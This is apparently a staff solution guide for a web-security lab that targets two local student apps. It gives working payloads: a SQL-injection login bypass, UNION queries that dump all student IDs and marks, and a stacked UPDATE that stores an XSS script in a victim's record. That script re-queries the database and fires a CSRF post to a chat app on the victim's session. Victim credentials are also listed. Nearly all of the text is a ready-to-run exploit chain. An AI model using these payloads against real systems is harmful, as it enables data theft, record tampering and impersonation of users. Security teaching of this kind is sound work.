## 1. Confirm SQL injection

- Password: anything

The trailing `-- -` comments out the `AND password = '...'` clause entirely, so the
login succeeds without the password ever being checked.

## 4. Enumerate student IDs and extract marks

```sql
x' UNION SELECT 1,'',GROUP_CONCAT(student_id,':',total_marks ORDER BY student_id SEPARATOR '<br>'),'x','x',0 FROM student -- -
```

Submit this as the **username** field (password field can be anything). The rendered
page lists all fifteen student IDs with their exact current `total_marks`.

To get the average directly instead of computing it by hand:

```sql
x' UNION SELECT 1,'',FORMAT(AVG(total_marks),2),'x','x',0 FROM student -- -
```

Expected result: `79.28`.

## 5. Identify the victim and persist the stored-XSS payload in their record

The attacker already knows the victim's student ID from the disclosed credentials
(`9900002`), or from the enumeration in Step 4. Submit the following Student Portal
login, keeping the attacker's own real credentials intact so the request still behaves
like a normal successful login for the attacker:

- Username: `tahsin.talukder`
- Password:

```sql
talukder-99'; UPDATE student SET last_name='<script>fetch("http://localhost:8000/login",{method:"POST",headers:{"content-type":"application/x-www-form-urlencoded"},body:"username="+encodeURIComponent("x'' UNION SELECT 1,2,CONCAT(CHAR(64,64),FORMAT(AVG(total_marks),2),CHAR(64,64)),4,5,6 FROM student -- -")+"&password=x"}).then(function(r){return r.text()}).then(function(h){var m=h.match(/@@(.*?)@@/);var avg=m?m[1]:"";fetch("http://localhost:8001/send",{method:"POST",headers:{"content-type":"application/x-www-form-urlencoded"},credentials:"include",body:"body="+encodeURIComponent("The average total marks of all students is: "+avg)})});</script>' WHERE student_id=9900002; -- -
```

The average is **not** written into the payload as a constant. Instead the stored
script computes it live at the moment the chain fires, so the number always reflects
the current `total_marks` in the database when the CSRF runs — even if marks were
edited after the payload was planted.

Why this works:

- The first statement still checks the attacker's real password, so this request
  behaves like an ordinary successful login for the attacker.
- The second, stacked statement updates **the victim's** `last_name`, not the
  attacker's own.
- The Student Portal renders `last_name` without escaping it, so the stored `<script>`
  will execute the next time the victim's profile is rendered — not the attacker's.
- When the script runs in the victim's browser it is on the Portal origin
  (`localhost:8000`), so its first `fetch` is same-origin and can *read* the response.
  That fetch re-uses the login injection point to run `FORMAT(AVG(total_marks),2)`,
  wrapping the result in `@@...@@` markers (built with `CHAR(64,64)` so the inner
  payload needs no quotes of its own). The regex `/@@(.*?)@@/` then pulls the freshly
  computed average out of the rendered `last_name` position.
- Only after it has the live value does the script post to Student Chat's `/send`
  endpoint with `credentials: "include"`. That second request is cross-origin
  (`8000` → `8001`) and form-encoded, so it is a "simple" request: no preflight, cookies
  attached, and the response need not be read. It rides the victim's own Chat session,
  since it is the victim's browser that renders this payload.

Quoting notes for staff: the whole value is a single-quoted SQL literal, so the one
single quote the inner injection needs (`x'`) is doubled to `x''`. Everything else in
the script uses double quotes and `CHAR(64,64)` in place of the `@@` string literal, so
there is no backslash escaping and no three-level quote nesting to get wrong. If a
student's Portal renders the injected row on a page other than the `/login` response
(e.g. a redirect to a profile view), the first `fetch` URL should point at whatever
endpoint surfaces the unescaped `last_name`; the rest is unchanged.

## 6. Trigger and verify the XSS to CSRF chain

The victim performs their normal routine: log into the Student Portal
(`rownak.bhuiyan` / `bhuiyan-99`) and view their profile. The stored script fires
automatically and posts to Student Chat. For this to work, the victim needs an active
Student Chat login (`rownak.bhuiyan` / `chat-Rownak-99`) in the same browser.

Open `http://localhost:8001` as the victim. A new message should appear:

```text
Rownak Bhuiyan: The average total marks of all students is: 79.28
```

The number in that message was computed by the payload itself at the instant the chain
fired (via the same-origin `AVG` re-query), not typed into the payload by the attacker.
If you edit any student's `total_marks` and have the victim log in again, the posted
average changes to match — a quick way to confirm the value is live rather than baked in.

The message is authored by the victim's own account, not the attacker's, and the
attacker never logged into the victim's Chat account or posted the message directly.
